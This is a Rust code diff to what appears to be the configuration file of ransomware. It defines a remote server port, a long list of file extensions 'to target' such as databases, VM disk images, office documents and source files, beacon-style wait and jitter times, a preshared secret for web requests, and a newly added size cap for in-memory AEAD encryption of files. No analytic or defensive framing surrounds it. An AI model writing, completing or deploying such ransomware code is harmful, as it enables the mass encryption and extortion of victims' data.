@@ -1,10 +1,4 @@
-#![allow(dead_code)]
-
 use std::{path::PathBuf, sync::LazyLock};
-
-macro_rules! vec_of_strings {
-    ($($x:expr),* $(,)?) => (vec![$($x.to_string()),*]);
-}
 
 /// Remote server port [required]
 pub const SERVER_PORT: u16 = 3000;
@@ -25,7 +19,7 @@ pub static BLOCKLIST_PATHS: LazyLock<Option<Vec<PathBuf>>> = LazyLock::new(|| No
 
 /// File extensions to target
 pub static ALLOWLIST_EXTENSIONS: LazyLock<Vec<String>> = LazyLock::new(|| {
-    vec_of_strings![
+    [
         "jar", "xps", "pub", "eml", "htm", "aif", "ai", "dwg", "sqlite", "db", "accdb", "mdb",
         "stl", "obj", "fbx", "3ds", "ply", "mpg", "mpeg", "webm", "mkv", "vsdm", "vsd", "vsdx",
         "mp4", "mp3", "vmdk", "ova", "ovf", "vmx", "qcow", "iso", "gif", "aac", "pl", "7z", "rar",
@@ -34,6 +28,9 @@ pub static ALLOWLIST_EXTENSIONS: LazyLock<Vec<String>> = LazyLock::new(|| {
         "xlsx", "ppt", "pptx", "odt", "jpg", "png", "csv", "sql", "sln", "php", "asp", "aspx",
         "html", "xml", "psd", "bmp", "pdf", "py", "rtf", "heic", "webp", "mov",
     ]
+    .iter()
+    .map(ToString::to_string)
+    .collect()
 });
 
 /// File extensions to avoid [optional]
@@ -86,6 +83,9 @@ pub const WAIT_TIME: u32 = 0;
 
 /// Jitter time applied to wait time in seconds [required]
 pub const JITTER_TIME: u32 = 0;
+
+/// Maximum file size in bytes to encrypt in a single in-memory AEAD operation [required]
+pub const MAX_ENCRYPT_FILE_BYTES: u64 = 256 * 1024 * 1024;
 
 /// Secret used to validate web requests [required]
 pub static PRESHARED_SECRET: LazyLock<String> =
